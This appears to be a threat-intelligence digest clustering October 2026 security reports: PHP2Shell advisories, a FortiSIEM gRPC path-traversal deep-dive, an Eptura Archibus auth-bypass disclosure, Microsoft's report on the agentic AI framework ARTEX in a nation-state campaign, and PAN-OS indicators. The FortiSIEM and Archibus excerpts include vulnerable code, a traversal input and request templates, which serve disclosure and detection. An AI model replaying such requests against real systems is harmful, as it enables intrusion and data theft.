- **Kaspersky Securelist** (threat_research_primary)
  - Title: Critical RCE vulnerabilities in PHP (CVE-2026-109618, CVE-2026-109619)
  - Published: 2026-10-21T15:18:04+00:00
  - Link: https://securelist.com/tr/php2shell-critical-vulnerabilities-in-php/121596/
  - Summary: We discuss the incident involving the leak of information about vulnerabilities CVE-2026-109618 and CVE-2026-109619. Kaspersky solutions detect the PHP2Shell exploit: we’ll walk you through examples using KEDR, KATA, and KES.
- **Exploit-DB** (offensive_vulnerability_research)
  - Title: [remote] PHP2Shell (CVE-2026-109618) - PHP core versions after v5.4 - RCE
  - Published: 2026-10-22T00:00:00+00:00
  - Link: https://www.exploit-db.com/exploits/52704
  - Summary: PHP2Shell (CVE-2026-109618) - PHP core versions after v5.4 - RCE
- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Critical PHP “PHP2Shell” RCE Vulnerabilities Allow Unauthenticated Remote Code Execution (CVSS 9.2)
  - Published: 2026-10-21T14:11:00+00:00
  - Link: https://orca.security/resources/blog/php2shell-php-rce-vulnerabilities/
  - Summary: Executive Summary Two critical vulnerabilities (CVE-2026-109618 and CVE-2026-109619, CVSS v4.0 9.2) were disclosed affecting PHP, allowing attackers to execute arbitrary code remotely at the PHP runtime level, before application code runs. Due to the potential for full server compromise across approximately 75% of websites using a known server-side language, immediate patching is required as soon […]
- **SANS Internet Storm Center** (government_authoritative)
  - Title: Critical PHP Vulnerability (CVE-2026-109618, CVE-2026-109619) [infocon yellow], (Wed, Oct 21st)
  - Published: 2026-10-21T21:02:43+00:00
  - Link: https://isc.sans.edu/diary/rss/33440
  - Summary: PHP.net announced that it will release a critical update today. We decided to change the infoCon to YELLOW due to the widespread use of PHP, the expected severity of the flaw (CVSS 9.4), and the availability of early PoC exploits before the patch became available.
- **Sysdig** (detection_response_operations)
  - Title: PHP2Shell (CVE-2026-109618 and CVE-2026-109619): Detecting unauthenticated remote code execution in PHP core
  - Published: 2026-10-22T00:00:00+00:00
  - Link: https://webflow.sysdig.com/blog/php2shell-cve-2026-109618-and-cve-2026-109619-detecting-unauthenticated-remote-code-execution-in-php-core
  - Summary: PHP2Shell (CVE-2026-109618 and CVE-2026-109619) lets an unauthenticated attacker run code on a PHP server with HTTP requests alone. The Sysdig Threat Research Team analyzed the exploitation and outlines affected versions, mitigations, and how to detect post-exploitation activity at runtime with Sysdig Secure and open source Falco.
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Responding to core PHP vulnerabilities CVE-2026-109618 and CVE-2026-109619
  - Published: 2026-10-21T14:00:00+00:00
  - Link: https://cloud.google.com/blog/products/identity-security/responding-to-core-php-vulnerabilities-cve-2026-109618-cve-2026-109619/
  - Summary: Editor's note : This blog was updated on Oct. 22, 2026 at 4:07 p.m. PDT with revised guidance for Security Command Center, and at 9:25 a.m. PDT, with revised guidance on Cloud Armor, and on Oct. 21, 2026, with additional guidance on monitoring, patching, and remediation. PHP and Wiz Research disclosed today two critical vulnerabilities in the core PHP language runtime that can expose applications to unauthenticated remote code execution and memory disclosure. Wiz used a mix of models to identify and help remediate these vulnerabilities. Notably, Gemini 4 Argon made an invaluable contribution to finding the vulnerability, exploit development, attack detection, and validation of the patch. While Google Cloud itself is not vulnerable, users of PHP running on Google Cloud may be vulnerable . At Google Cloud, we understand the severity of these vulnerabilities, and are sharing guidance to help our customers take immediate action to secure their applications. Vulnerability background PHP is
- **Sophos X-Ops** (detection_response_operations)
  - Title: Proof-of-concept exploit released for PHP vulnerabilities (CVE-2026-109618, CVE-2026-109619)
  - Published: 2026-10-21T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/proof-of-concept-exploit-released-for-php-vulnerabilities-109618-109619
  - Summary: Categories: Threat Research Tags: advisory, vulnerability, php
- **Elastic Security Labs** (detection_response_operations)
  - Title: php2shell: Assessing Elastic detection coverage relevant to CVE-2026-109618 and CVE-2026-109619
  - Published: 2026-10-21T00:00:00+00:00
  - Link: https://www.elastic.co/security-labs/threat-command/php2shell-php-rce-detection
  - Summary: CVE-2026-109618 and CVE-2026-109619 are critical PHP core RCE flaws that leaked ahead of disclosure. We cover what is verified, why exploitation converges on a web server spawning a shell, and the Elastic detections developed to catch this behavior.
- **AWS Security Blog** (cloud_identity_infrastructure)
  - Title: Using AWS WAF to apply mitigations for PHP2Shell RCE vulnerabilities (CVE-2026-109618 and CVE-2026-109619)
  - Published: 2026-10-22T00:50:04+00:00
  - Link: https://aws.amazon.com/blogs/security/using-aws-waf-to-apply-mitigations-for-php2shell-rce-vulnerabilities-cve-2026-109618-and-cve-2026-109619/
  - Summary: October 23, 2026: We updated this post for version 2.4 of the AWS WAF PHP application managed rule group, which adds the PHP2Shell_BODY_Extended rule for CVE-2026-109618, and AWS made it the default version. AWS is continuously updating the AWS WAF PHP managed rule group to add protection for both CVE-2026-109618 and CVE-2026-109619. If you use […]
- **Unit 42** (threat_research_primary)
  - Title: Threat Brief: Critical Vulnerabilities in PHP: CVE-2026-109618, CVE-2026-109619
  - Published: 2026-10-21T16:30:34+00:00
  - Link: https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/
  - Summary: CVE-2026-109618 and CVE-2026-109619 are Critical vulnerabilities in PHP, a scripting language used globally for web servers and CMS systems. The post Threat Brief: Critical Vulnerabilities in PHP: CVE-2026-109618, CVE-2026-109619 appeared first on Unit 42 .
- **Huntress** (detection_response_operations)
  - Title: Rapid Response: php2shell, Leaked Critical PHP Vulnerabilities (CVE-2026-109618 & CVE-2026-109619)
  - Published: 2026-10-21T04:00:00+00:00
  - Link: https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities
  - Summary: Two critical PHP RCEs, CVE-2026-109618 and CVE-2026-109619, leaked before the patch. Learn what's known, who's exposed, and how to prepare now.
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - Title: PHP2Shell - Critical vulnerabilities in PHP (CVE-2026-109618, CVE-2026-109619): detection, analysis, and remediation
  - Published: 2026-10-21T00:00:00+00:00
  - Link: https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/
  - Summary: Learn about the two critical vulnerabilities in PHP dubbed PHP2Shell.
- **NCSC UK** (government_authoritative)
  - Title: Critical security issue affecting PHP
  - Published: 2026-10-21T12:00:00+00:00
  - Link: https://www.ncsc.gov.uk/news/critical-security-issue-affecting-php
  - Summary: Updated: The NCSC is encouraging UK organisations to take immediate action to mitigate a security issue affecting PHP (CVE-2026-109618 and CVE-2026-109619).
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: PHP2Shell Exploit Attempts Hit Millions as Attackers Try to Deploy Mirai Malware
  - Published: 2026-10-23T07:40:45+00:00
  - Link: https://thehackernews.com/2026/10/php2shell-exploit-attempts-hit-millions.html
  - Summary: Threat actors have been observed unsuccessfully attempting to exploit the newly disclosed PHP2Shell vulnerabilities to rope infected systems into a Mirai botnet variant called Potassium, as it emerges that weaponizing the flaws may be harder than previously thought. The attacks aim to exploit CVE-2026-109618 and CVE-2026-109619 (CVSS scores: 9.2), which can result in unauthenticated remote
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: PHP rce CVE-2026-109618
  - Published: 2026-10-20T21:56:59+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1xb5g1c/php_rce_cve2026109618/
  - Summary: submitted by /u/Wploplin [link] [comments]

### Cluster 1b0472c213 — score 36

- Title: CVE-2026-106173 Deep-Dive: FortiSIEM gRPC Path Traversal File Write RCE
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-20T12:34:42+00:00
- Link: https://horizon3.ai/attack-research/cve-2026-106173-deep-dive-fortisiem-grpc-path-traversal-file-write-rce/
- Fetch status: ok
- Member count: 6
- Corroborating source count: 4
- Strong signals: CVE-2026-106173, Fortinet

#### Cluster taxonomy (union across members)
- affected_products: Fortinet, Ivanti
- cve_ids: CVE-2023-34992, CVE-2024-23108, CVE-2025-64155, CVE-2026-106173
- urgency_signals: poc_available, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_2_operator, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- affected_products: Fortinet
- cve_ids: CVE-2026-106173, CVE-2023-34992, CVE-2024-23108, CVE-2025-64155
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Horizon3 researchers analyze CVE-2026-106173, a critical Fortinet FortiSIEM vulnerability affecting an unauthenticated gRPC service. The deep-dive explains how path traversal and null-byte handling enable arbitrary file writes and remote code execution, along with indicators of compromise for defenders.
```

#### Full body

```
CVE-2026-106173 Deep-Dive: FortiSIEM gRPC Path Traversal File Write RCE Zach Hanley October 20, 2026 Attack Research On 13 October 2026, Fortinet published a security advisory for a critical vulnerability affecting their FortiSIEM product. The vulnerability, CVE-2026-106173, allows for an arbitrary file write by abusing an issue in a gRPC service. Horizon3 is no stranger to the FortiSIEM. We’ve disclosed several critical vulnerabilities through the years that you can catch up on: CVE-2023-34992: Fortinet FortiSIEM Command Injection Deep-Dive CVE-2024-23108: Fortinet FortiSIEM 2nd Order Command Injection Deep-Dive CVE-2025-64155: Three Years of Remotely Rooting the Fortinet FortiSIEM All of our prior research has involved the same component, the phMonitor service which listens on port tcp/7900. This latest advisory details a new service that we had never looked at, a gRPC service on port tcp/27918. Given our familiarity and the intrigue of a new service to look at we dove in. Reaching the Vulnerable Service Looking at the listening services on the FortiSIEM, we find that phQueryMaster is bound to tcp/27918. The phQueryMaster service stands the gRPC server up in grpcNotificationServer::run() . The listen port comes from the command_port config value (7918), which is passed through phSecureUtils::getGrpcPort() and mapped to tcp/27918; the address is built as [::]:27918 , so the service binds every interface. // grpcNotificationServer::run() (libphGrpcServices.so) unsigned short port = mServerPort; // command_port = 7918 std::string addr = "[::]:" + phSecureUtils::getGrpcPort(port); // [::]:27918 grpc::SslServerCredentialsOptions sslOps; // sslOps.client_certificate_request stays 0 == GRPC_SSL_DONT_REQUEST_CLIENT_CERTIFICATE auto creds = grpc::SslServerCredentials(sslOps); builder.AddListeningPort(addr, creds, 0); builder.RegisterService(&svc); builder.BuildAndStart(); Sometimes, gRPC servers can require client certificates for authentication, but here there server sets that option to false. This means any remote client can connect to the gRPC service on port tcp/27918 unauthenticated and without presenting a client certificate to reach the vulnerable gRPC service. The Path to Arbitrary File Write Now that we’ve found the vulnerable gRPC service, we inspect the available RPC methods and find SendQueryResult . message QueryResultReq { bytes file_content = 1; } service phoenixSvc { rpc SendQueryResult(stream QueryResultReq) returns (PhoenixReply); } SendQueryResult ’s handler parses four values from the received message: query-id , src-ip , period-start , and period-end . The handler then constructs a file path with the lightly formatted src-ip and query-id. // grpcNotificationService::SendQueryResult (grpcNotificationService.cpp) replaceString(srcIp, ".", "_"); std::string fileDir = "/query/result/" + queryId; if (!phMiscUtils::DirExists(fileDir.c_str())) phMiscUtils::mkdir(fileDir.c_str()); Bug #1 is that fileDir is built by string concatenation with an attacker controlled value, without any input validation. A query-id of ../../../../../tmp/x allows an attacker to traverse outside of the query directory. So an attacker has arbitrary directory control. The filename itself is also partially attacker controlled, result-<srcIp>-0-0-<id>.dat , and the streamed bytes that follow will be the files contents. std::stringstream path; path << fileDir << "/result-" << srcIp << "-" << periodStart << "-" << periodEnd << "-" << mGetQueryResultUniqId() << ".dat"; std::ofstream output; output.open(path.str().c_str(), ios::binary|ios::out|ios::trunc); while (reader->Read(&req)) output.write(req.file_content().data(), req.file_content().size()); So ultimately, an unauthenticated attacker can write arbitrary data into an arbitrary directory, but with a limited filename. The minimal request is one gRPC SendQueryResult with this metadata: query-id: ../../../../../tmp/fortisiem-cve-2026-106173 src-ip: 127.0.0.1 period-start: 0 period-end: 0 which creat
```

#### Corroborating sources (4)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-106173 Deep-Dive: FortiSIEM gRPC Path Traversal File Write RCE
  - Published: 2026-10-20T12:34:42+00:00
  - Link: https://horizon3.ai/attack-research/cve-2026-106173-deep-dive-fortisiem-grpc-path-traversal-file-write-rce/
  - Summary: Horizon3 researchers analyze CVE-2026-106173, a critical Fortinet FortiSIEM vulnerability affecting an unauthenticated gRPC service. The deep-dive explains how path traversal and null-byte handling enable arbitrary file writes and remote code execution, along with indicators of compromise for defenders.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical FortiSIEM Flaw Gets Public Exploit PoC for Unauthenticated Remote Code Execution
  - Published: 2026-10-20T15:38:52+00:00
  - Link: https://thehackernews.com/2026/10/critical-fortisiem-flaw-gets-public.html
  - Summary: Cybersecurity researchers have released a proof-of-concept (PoC) exploit for a recently patched critical security flaw impacting Fortinet FortiSIEM that could result in arbitrary code execution. The vulnerability, tracked as CVE-2026-106173 (CVSS score: 9.4), is a critical path traversal flaw that could allow an unauthenticated attacker to execute unauthorized code or commands via specially
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: CVE-2026-106173 Deep-Dive: Fortinet FortiSIEM gRPC Path Traversal File Write to RCE
  - Published: 2026-10-20T12:55:10+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1xardr3/cve2026106173_deepdive_fortinet_fortisiem_grpc/
  - Summary: submitted by /u/scopedsecurity [link] [comments]
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Cyber Security Intelligence: Analysis of Edge Devices Amid Growing Vulnerabilities
  - Published: 2026-10-19T14:07:29+00:00
  - Link: https://www.team-cymru.com/post/cyber-security-intelligence-edge-device-analysis
  - Summary: Cisco, Ivanti & Fortinet edge device attacks are rising. Read our cybersecurity intelligence on cybersecurity trends and attack patterns.

### Cluster 6bd2c4e8d4 — score 32

- Title: Authentication Bypass, Remote Code Execution, and Database Read in Eptura Archibus (FIXED)
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-10-19T15:57:43+00:00
- Link: https://www.rapid7.com/blog/post/ve-authentication-bypass-remote-code-execution-and-database-read-in-eptura-archibus-fixed
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure, zero_day
- cve_ids: CVE-2026-107186
- urgency_signals: critical_cvss, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: zero_day, vulnerability_disclosure
- cve_ids: CVE-2026-107186
- urgency_signals: zero_day, preauth_unauth, critical_cvss
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered three new vulnerabilities in Eptura Archibus . A legacy API endpoint could be exploited to bypass authentication and run various functions without authentication ( CVSS: 8.6 High ). The most serious functions allow for full database read ( CVSS: 8.5 High ) and an insecure file upload ( CVSS: 9.6 Critical ). The insecure file upload leads to remote code execution. Product description Archibus helps organizations administer and manage their physical buildings, equipment, and real estate from a single central location. Users can track assets, maintenance work orders, real estate lease information, and desk or room reservations. According to Eptura , in 2023 over 16,000 companies and 40% of the Fortune 500 used Archibus. Impact A malicious actor with network access to the server via HTTP can read secrets and passwords out of the database. They can also run code to execute s
```

#### Full body

```
Zero-Day Authentication Bypass, Remote Code Execution, and Database Read in Eptura Archibus (FIXED) Marcus Chang Oct 19, 2026 | Last updated on Oct 19, 2026 | 9 min read Authentication Bypass, Remote Code Execution, and Database Read in Eptura Archibus (FIXED) Table of contents Authentication Bypass, Remote Code Execution, and Database Read in Eptura Archibus (FIXED) Table of contents Overview While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered three new vulnerabilities in Eptura Archibus . A legacy API endpoint could be exploited to bypass authentication and run various functions without authentication ( CVSS: 8.6 High ). The most serious functions allow for full database read ( CVSS: 8.5 High ) and an insecure file upload ( CVSS: 9.6 Critical ). The insecure file upload leads to remote code execution. Product description Archibus helps organizations administer and manage their physical buildings, equipment, and real estate from a single central location. Users can track assets, maintenance work orders, real estate lease information, and desk or room reservations. According to Eptura , in 2023 over 16,000 companies and 40% of the Fortune 500 used Archibus. Impact A malicious actor with network access to the server via HTTP can read secrets and passwords out of the database. They can also run code to execute system commands as ‘NT AUTHORITY/Local Service’ and gain control of the server. Credit This vulnerability was discovered by Marcus Chang, Security Consultant at Rapid7 and is being disclosed in accordance with Rapid7's vulnerability disclosure policy . CVE-2026-107186 - Archibus Authentication Bypass The Archibus Web Central web application uses Java Direct Web Remoting (DWR) for various API functionality, which allows requests with multiple method calls. The isPasswordUppercase method sets a system session in the thread, and the runWorkflowRule method gets the set session for authentication. This allows malicious actors to run seemingly any workflow rule without providing authentication. Rapid7 tested the AbCommonResources-writeHTMLtoFile and AbCommonResources-getDataRecords workflow rules. Technical Analysis Most DWR methods require auth and DWR allows you to make multiple calls in a single request by editing the callCount parameter and adding other method parameters to the request. DWR processes multiple calls in a single batch sequentially on the same thread. The SecurityServiceImpl.isPasswordUppercase() method is whitelisted for pre-auth access, and internally calls loadTableDef() which sets the core system user session on the thread-local ContextStore: // SecurityServiceImpl.java - loadTableDef() private TableDef.ThreadSafe loadTableDef(String projectId, final String tableName) { Context context = ContextStore.get(); final Project.Immutable project = configManager.findProject(projectId); UserSession.Immutable coreUserSession = project.loadCoreUserSession(); context.setUserSession(coreUserSession); // <-- sets privileged session on context // ... } DWRWorkflowService.runWorkflowRule() uses the privileged context set by isPasswordUppercase . If getUserSession() was invalid, it returns a session timeout, otherwise it continues execution. The end result is the workflow of the users choosing running without the user providing any authentication: // DWRWorkflowService.java - runWorkflowRule() ContextCacheable.Immutable targetContext = ContextStore.get().getUserSession(); // ... if (targetContext == null) { handleSessionTimeout(workflowRuleName, workflowRuleInputs, result); return result; } Exploitation For exploitation, the scriptSessionId and PROJECT_ID are required. The DWR API requests are in the following format: POST /archibus/dwr/call/plaincall/single.2.dwr Content-Type: text/plain Cookie: DWRSESSIONID=abc callCount=1 batchId=0 instanceId=0 page=%2F scriptSessionId=abc/def c0-scriptName=<SCRIPT_NAME> c0-methodName=<METHOD_NAME> c0-id=0 c0-param0=string:<PROJECT
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Authentication Bypass, Remote Code Execution, and Database Read in Eptura Archibus (FIXED)
  - Published: 2026-10-19T15:57:43+00:00
  - Link: https://www.rapid7.com/blog/post/ve-authentication-bypass-remote-code-execution-and-database-read-in-eptura-archibus-fixed
  - Summary: Overview While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered three new vulnerabilities in Eptura Archibus . A legacy API endpoint could be exploited to bypass authentication and run various functions without authentication ( CVSS: 8.6 High ). The most serious functions allow for full database read ( CVSS: 8.5 High ) and an insecure file upload ( CVSS: 9.6 Critical ). The insecure file upload leads to remote code execution. Product description Archibus helps organizations administer and manage their physical buildings, equipment, and real estate from a single central location. Users can track assets, maintenance work orders, real estate lease information, and desk or room reservations. According to Eptura , in 2023 over 16,000 companies and 40% of the Fortune 500 used Archibus. Impact A malicious actor with network access to the server via HTTP can read secrets and passwords out of the database. They can also run code to execute s

### Cluster fbd47b91b1 — score 28

- Title: AI-driven, large-scale nation-state campaign using ARTEX enables supply chain compromise
- Source: Microsoft Threat Intelligence (threat_research_primary)
- Published: 2026-10-21T18:23:55+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/10/21/storm-0940-uses-artex-agentic-ai-connectwise-supply-chain-compromise/
- Fetch status: ok
- Member count: 10
- Corroborating source count: 7
- Strong signals: Microsoft 365

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, mfa_bypass, phishing_social_eng, supply_chain
- affected_industries: critical_infrastructure, financial_services, government, manufacturing_industrial
- affected_products: Microsoft 365, Microsoft Defender
- content_type: incident_report, news_report
- confidence_tier: tier_1_primary_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, apt_espionage
- affected_industries: financial_services, government, critical_infrastructure, manufacturing_industrial
- affected_products: Microsoft 365, Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Storm-0940 used ARTEX agentic AI to accelerate a ConnectWise supply chain compromise, enabling application credential abuse across Microsoft 365 environments. The post AI-driven, large-scale nation-state campaign using ARTEX enables supply chain compromise appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Supply chain attack Threats intelligence AI threats Supply chain attacks Content types Research Products and services Microsoft Defender Microsoft Defender for Cloud Apps Microsoft Defender XDR Microsoft Entra Microsoft Sentinel Topics Actionable threat insights AI and agents Threat intelligence As early as September 2026, Storm-0940, a China-state aligned actor, used the agentic AI penetration testing framework ARTEX to automate attacks targeting hundreds of organizations globally across a broad range of industries. Several of these Storm-0940 ARTEX-driven attacks have resulted in the actor obtaining privileged access to an organization’s cloud infrastructure – including multiple instances where the time from initial targeting to privileged access was less than 3 hours. Microsoft assesses that Storm-0940 was responsible for the recently disclosed ConnectWise supply chain compromise of a multi-tenant application. This activity demonstrates how threat actors are integrating agentic AI into existing offensive security workflows and allows them to scale their operations exponentially. Agents are not constrained by factors affecting humans – they can work around the clock, on weekends, and on holidays and attempt multiple breach paths simultaneously enabling significantly reduced time from selecting a target to achieving objectives, increasing the speed and impact of complex attacks like supply chain compromises. Storm-0940’s use of ARTEX accelerated the speed of compromised application abuse to authenticate to Microsoft 365 customer environments through applications that had already been granted access. This allowed the threat actor to operate without requiring an interactive user sign-in. In multiple affected environments, Microsoft observed AI-accelerated follow-on activity through Microsoft Graph, including reconnaissance, application credential changes, and attempts to modify privileges that could enable expanded or persistent access. The activity conducted by the threat actor through the usage of ARTEX framework did not result from a compromise of or a vulnerability in Microsoft corporate systems, products, or services. Although Microsoft identified Storm-0940-initiated authentication and follow-on activity in multiple customer environments, the presence of an affected application or successful threat actor authentication does not necessarily indicate that customer data was accessed or exfiltrated. Microsoft Defender XDR provides detections and hunting queries for suspicious Microsoft Graph activity and activity associated with known threat infrastructure. Customers should review service principal sign-ins, investigate unexpected application credential or privilege changes, and follow ConnectWise’s published containment guidance while preserving relevant evidence for investigation. For a full list of detections please see the detections section. What’s happening Storm-0940 is a China-state aligned actor (with no known industry aliases) that has been active since 2021 and targets organizations across multiple industries for data theft. The actor has historically gained initial access using password spraying and exploitation of internet-facing applications, before using compromised accounts to move through targeted environments. In cloud environments, the actor has also established persistence by adding credentials to existing OAuth applications, allowing continued access to Microsoft 365 resources. The actor has used these applications to access and exfiltrate email and other data through Microsoft Graph. As early as September 2026, Storm-0940 used the agentic AI penetration testing framework ARTEX to automate attacks targeting hundreds of organizations globally across a broad range of industries. These include aerospace and defense, automotive, chemicals, energy, financial services, government, legal, manufacturing, media, military, semiconductor, software, technology, and think tanks and
```

#### Corroborating sources (7)

- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: AI-driven, large-scale nation-state campaign using ARTEX enables supply chain compromise
  - Published: 2026-10-21T18:23:55+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/10/21/storm-0940-uses-artex-agentic-ai-connectwise-supply-chain-compromise/
  - Summary: Storm-0940 used ARTEX agentic AI to accelerate a ConnectWise supply chain compromise, enabling application credential abuse across Microsoft 365 environments. The post AI-driven, large-scale nation-state campaign using ARTEX enables supply chain compromise appeared first on Microsoft Security Blog .
- **Microsoft Security Blog** (threat_research_primary)
  - Title: AI-driven, large-scale nation-state campaign using ARTEX enables supply chain compromise
  - Published: 2026-10-21T18:23:55+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/10/21/storm-0940-uses-artex-agentic-ai-connectwise-supply-chain-compromise/
  - Summary: Storm-0940 used ARTEX agentic AI to accelerate a ConnectWise supply chain compromise, enabling application credential abuse across Microsoft 365 environments. The post AI-driven, large-scale nation-state campaign using ARTEX enables supply chain compromise appeared first on Microsoft Security Blog .
- **CyberScoop** (cyber_news_breach_reporting)
  - Title: ConnectWise customers hit by supply-chain attack linked to compromised API secret
  - Published: 2026-10-20T16:17:52+00:00
  - Link: https://cyberscoop.com/connectwise-cloud-backup-supply-chain-attack/
  - Summary: Hundreds of customers are confirmed impacted, as attackers use a sensitive credential to break into connected Microsoft 365 applications unimpeded. The post ConnectWise customers hit by supply-chain attack linked to compromised API secret appeared first on CyberScoop .
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Microsoft 365 accounts compromised at 79 organizations, no passwords needed
  - Published: 2026-10-23T11:45:12+00:00
  - Link: https://www.helpnetsecurity.com/2026/10/23/microsoft-365-accounts-stolen-sessions/
  - Summary: An attacker who spent ten weeks replaying stolen Microsoft 365 sign-in sessions broke into email accounts at 79 organizations and used hidden inbox rules to keep victims from seeing parts of their own mail, according to Huntress. The researchers tracked the campaign between July 14 and September 22, 2026, counting 497 successful sign-ins and more than 200,000 failed login attempts. The stolen sessions were replayed from servers at 1337 Services GmbH, a hosting provider incorporated … More → The post Microsoft 365 accounts compromised at 79 organizations, no passwords needed appeared first on Help Net Security .
- **Huntress** (detection_response_operations)
  - Title: M365 Token Spray and Replay Campaign Compromises Business Email Accounts
  - Published: 2026-10-22T13:00:00+00:00
  - Link: https://www.huntress.com/blog/token-replay-spray
  - Summary: Huntress tracked a 10-week Microsoft 365 campaign pairing AiTM relays with token replay, rogue Entra devices, MFA tampering, and hidden inbox rules.
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Widespread Token-Spraying Attacks Target Microsoft 365 Accounts For Email Compromise
  - Published: 2026-10-23T10:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/tokenspraying-attacks-target/
  - Summary: Security researchers identified attempts to access corporate networks which have been linked to a major Microsoft 365-targeted BEC campaign using phishing, stolen session tokens and social engineering
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: ConnectWise Disables Cloud Backups Amid Concerns for Downstream MSPs
  - Published: 2026-10-19T19:19:33+00:00
  - Link: https://www.darkreading.com/identity-access-management-security/connectwise-disables-cloud-backups-downstream-msps
  - Summary: Researchers say attackers authenticated into Microsoft 365 tenants using ConnectWise credentials; ConnectWise says customer impact remains unconfirmed.

### Cluster d3ec98e7ca — score 25

- Title: Threat Brief: Active Exploitation of May 2026 PAN-OS CVE-2026-0257 (Updated October 20)
- Source: Unit 42 (threat_research_primary)
- Published: 2026-10-20T20:30:42+00:00
- Link: https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/
- Fetch status: ok
- Member count: 3
- Corroborating source count: 3
- Strong signals: CVE-2026-0257, Palo Alto Networks

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, zero_day
- affected_products: Ivanti, Microsoft Windows, Palo Alto Networks
- cve_ids: CVE-2026-0257
- urgency_signals: actively_exploited, poc_available, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, active_exploitation
- affected_products: Palo Alto Networks, Microsoft Windows
- cve_ids: CVE-2026-0257
- urgency_signals: actively_exploited, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Summary

```
Ransomware operators including Spikey Scorpius (aka Qilin) and Tarnished Scorpius (aka Inc) are exploiting PAN-OS vulnerability CVE-2026-0257. The post Threat Brief: Active Exploitation of May 2026 PAN-OS CVE-2026-0257 (Updated October 20) appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center High Profile Threats Vulnerabilities Vulnerabilities Threat Brief: Active Exploitation of May 2026 PAN-OS CVE-2026-0257 (Updated October 20) 5 min read Related Products Advanced URL Filtering Cortex Cortex Xpanse GlobalProtect Next-Generation Firewall Unit 42 Deep and Dark Web Service Unit 42 Incident Response Unit 42 Threat Intelligence Services By: Andy Piazza Unit 42 Published: October 20, 2026 Categories: High Profile Threats Vulnerabilities Tags: CVE-2026-0257 Vulnerability Share Executive Summary October 19 Update: Unit 42 continues to observe attempted exploitation of CVE-2026-0257 by ransomware operators including Spikey Scorpius (aka Qilin) and Tarnished Scorpius (aka Inc). We’re also aware of public reporting attributing exploitation to threat actors using Settra ransomware. Palo Alto Networks Unit 42 has observed active exploitation of PAN-OS vulnerability CVE-2026-0257 by an unidentified threat actor attempting to access GlobalProtect. This security flaw involves an authentication bypass in the portal and gateway components of vulnerable versions of PAN-OS ® software, which could allow unauthorized attackers to circumvent security controls and initiate virtual private network (VPN) connections. This CVE was added to the Known Exploited Vulnerability (KEV) catalog on May 13, 2026. No post-access behavior or lateral movement has been identified as of this time. Only a small portion of the probed devices actually established VPN sessions, resulting in gateway-connected events. We advise organizations to proactively hunt for the indicators of the activity specified in this report and activate incident response protocols for any successful gateway-connected events linked to these indicators. Additionally, we strongly recommend reviewing the security advisory for CVE-2026-0257 , following the available workarounds and mitigations or upgrading to a version that includes a fix for this issue. For pre-proof-of-concept release (May 29, 2026) activities, search for these IP addresses in GlobalProtect logs to look for successful login connection: 23.128.228[.]6 104.207.144[.]154 146.19.216[.]119 146.19.216[.]120 146.19.216[.]125 179.43.172[.]213 185.195.232[.]139 198.12.106[.]60 202.144.192[.]47 Search GlobalProtect logs for successful gateway-connected events from any IP address using suspicious host IDs or device names, including but not limited to: aa:bb:cc:dd:ee:ff 00:11:22:33:44:55 WINDOWS-LAPTOP-001 DESKTOP-GP01 GP-CLIENT As part of post-PoC release monitoring, search GlobalProtect logs for successful gateway-connected events matching the following hard-coded client configuration values from the PoC code. endpoint_os_version : Microsoft Windows 10 Pro 64-bit source_user_info.domain : empty We encourage organizations to consult our official Palo Alto Networks Security Advisory for additional details about the vulnerability, impacted products and configuration guidance. We also recommend reading Rapid7 ’s technical analysis about the exploitation activity they observed in the wild. Palo Alto Networks Cortex Xpanse is able to identify publicly exposed PAN-OS gateways and GlobalProtect portals. Management Interface Exposure Risk and Remediation During incident response (IR) engagements associated with the Lunar Peak campaign , Unit 42 observed a recurring 